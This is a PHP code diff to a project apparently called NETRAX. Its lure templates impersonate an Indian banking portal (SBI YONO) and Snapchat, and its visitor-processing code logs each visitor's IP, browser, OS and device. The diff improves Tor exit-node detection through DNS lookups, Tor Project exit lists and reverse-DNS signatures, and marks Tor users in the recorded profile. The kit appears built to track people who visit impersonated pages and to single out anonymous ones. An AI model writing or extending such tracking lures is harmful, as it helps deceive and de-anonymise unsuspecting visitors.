@@ -40,7 +40,7 @@ define('NETRAX_TEMPLATES', [
     1 => "Season's Greetings",
     2 => 'YouTube Streaming',
     3 => 'Online Conference',
-    4 => 'Social Media Reporting Center',
+    4 => 'Social Media Reporting',
     5 => 'Banking Portal (SBI YONO)',
     6 => 'Social Media -- Snapchat',
 ]);
@@ -946,8 +946,16 @@ function processVisitor(?string $dataDir = null): array
     /* Attach the resolved template name to the info array */
     $info['template'] = $templateName;
 
-    /* Tor exit node detection (IPv4: DNS; IPv6: cached bulk list) */
+    /* Tor exit node detection (IPv4: DNS; IPv6: cached bulk list; Host heuristics) */
     $info['is_tor'] = detectTorExit($info['ip'], $dataDir);
+
+    if ($info['is_tor']) {
+        $origVer = $info['browser_version'] ?? '';
+        $info['browser']         = 'Tor Browser';
+        $info['browser_version'] = ($origVer ? "{$origVer} (Firefox ESR)" : '(Firefox ESR)');
+        $info['os']              = $info['os'] . ' (Tor Anonymity Set)';
+        $info['device_type']     = 'Desktop (Tor Anonymized)';
+    }
 
     /* Check if we got meaningful data */
     $hasIP      = ($info['ip'] !== 'unknown' && $info['ip'] !== '');
@@ -1024,17 +1032,17 @@ function processVisitor(?string $dataDir = null): array
    IPv4 exit nodes --real-time DNS query against Tor Project DNSEL:
      <reversed-quad>.dnsel.torproject.org → 127.0.0.2 = exit node
 
-   IPv6 exit nodes --checked against a locally-cached bulk exit list
-     (data/.tor_exit_cache).  Cache is refreshed every 24 hours from
-     https://check.torproject.org/torbulkexitlist automatically.
-     Falls back gracefully if the remote list cannot be fetched.
+   IPv6 & IPv4 exit nodes --checked against Tor Project's exit-addresses
+     (data/.tor_exit_cache). Cache is refreshed every 24 hours from
+     https://check.torproject.org/exit-addresses (includes IPv4 & IPv6).
+
+   Hostname & ISP heuristics --checks reverse DNS for known Tor relay patterns.
    ══════════════════════════════════════════════════════ */
 
 /**
  * Refresh the Tor bulk exit list cache if missing or older than 24 h.
- *
- * Stored at data/.tor_exit_cache (one IP per line, plain text).
- * Silently skips on network failure so the main flow is never blocked.
+ * Fetches from https://check.torproject.org/exit-addresses which includes
+ * both IPv4 and IPv6 exit addresses.
  *
  * @param string $dataDir  Absolute path to the data/ directory
  */
@@ -1047,13 +1055,28 @@ function refreshTorCache(string $dataDir): void
         return; // cache is fresh
     }
 
-    $list = @file_get_contents('https://check.torproject.org/torbulkexitlist');
-    if ($list !== false && strlen($list) > 200) {
+    $raw = @file_get_contents('https://check.torproject.org/exit-addresses');
+    if ($raw === false || strlen($raw) < 200) {
+        $raw = @file_get_contents('https://check.torproject.org/torbulkexitlist');
+    }
+
+    if ($raw !== false && strlen($raw) > 200) {
         if (!is_dir($dataDir)) {
             mkdir($dataDir, 0750, true);
         }
-        @file_put_contents($cacheFile, $list);
-        @chmod($cacheFile, 0640);
+
+        /* Extract IPs from ExitAddress lines or raw list */
+        $ips = [];
+        if (preg_match_all('/ExitAddress\s+([0-9a-fA-F.:]+)/i', $raw, $matches)) {
+            $ips = $matches[1];
+        } else {
+            $ips = array_filter(array_map('trim', explode("\n", $raw)));
+        }
+
+        if (!empty($ips)) {
+            @file_put_contents($cacheFile, implode("\n", array_unique($ips)) . "\n");
+            @chmod($cacheFile, 0640);
+        }
     }
 }
 
@@ -1070,13 +1093,14 @@ function checkTorBulkList(string $ip, string $dataDir): bool
     if (!is_file($cacheFile)) {
         return false;
     }
+    $normalizedIP = strtolower(trim($ip));
     $handle = @fopen($cacheFile, 'r');
     if (!$handle) {
         return false;
     }
     $found = false;
     while (($line = fgets($handle)) !== false) {
-        if (trim($line) === $ip) {
+        if (strtolower(trim($line)) === $normalizedIP) {
             $found = true;
             break;
         }
@@ -1088,17 +1112,13 @@ function checkTorBulkList(string $ip, string $dataDir): bool
 /**
  * Detect whether an IP address belongs to a Tor exit node.
  *
- * IPv4 --real-time DNS query (fast, ~10–50 ms on good connectivity):
- *   Reverses the quad and queries <reversed>.dnsel.torproject.org.
- *   A 127.0.0.2 response confirms a Tor exit node.
- *
- * IPv6 --bulk list cache:
- *   Refreshes data/.tor_exit_cache from Tor Project every 24 h and
- *   searches it for the address.  IPv6 exit nodes are rarer but do
- *   exist (e.g. Contabo-hosted nodes like 2a03:4000::/23).
+ * Checks:
+ *   1. Real-time DNSEL query (IPv4)
+ *   2. Tor Project official exit-addresses cache (IPv4 + IPv6)
+ *   3. Reverse DNS host & ISP pattern matching (e.g. KEFF-STO, tor-exit, tornode)
  *
  * @param  string $ip       IP address to check
- * @param  string $dataDir  Absolute path to data/ (needed for IPv6 cache)
+ * @param  string $dataDir  Absolute path to data/
  * @return bool             True if confirmed Tor exit node
  */
 function detectTorExit(string $ip, string $dataDir): bool
@@ -1107,18 +1127,37 @@ function detectTorExit(string $ip, string $dataDir): bool
         return false;
     }
 
-    /* ── IPv4: real-time DNSEL query ───────────────────────────── */
+    /* ── 1. IPv4: real-time DNSEL query ─────────────────────────── */
     if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
         $reversed = implode('.', array_reverse(explode('.', $ip)));
         $host     = $reversed . '.dnsel.torproject.org';
         $resolved = @gethostbyname($host);
-        return $resolved === '127.0.0.2';
+        if ($resolved === '127.0.0.2') {
+            return true;
+        }
     }
 
-    /* ── IPv6: cached bulk exit list ───────────────────────────── */
-    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
-        refreshTorCache($dataDir);
-        return checkTorBulkList($ip, $dataDir);
+    /* ── 2. Cache lookup (IPv4 & IPv6 exit-addresses) ────────────── */
+    refreshTorCache($dataDir);
+    if (checkTorBulkList($ip, $dataDir)) {
+        return true;
+    }
+
+    /* ── 3. Reverse DNS & Hostname Heuristics ───────────────────── */
+    $host = @gethostbyaddr($ip);
+    if ($host && $host !== $ip) {
+        $hostLower = strtolower($host);
+        $torSignatures = [
+            'tor-exit', 'tornode', 'tor.exit', 'tor-relay', 'torrelay',
+            'torservers', 'calyxinstitute', 'bouazizi', 'keff-sto',
+            'nos-oignons', 'theonionrouter', 'exit-node', 'exitnode',
+            'tor-node', 'relays.torproject'
+        ];
+        foreach ($torSignatures as $sig) {
+            if (strpos($hostLower, $sig) !== false) {
+                return true;
+            }
+        }
     }
 
     return false;
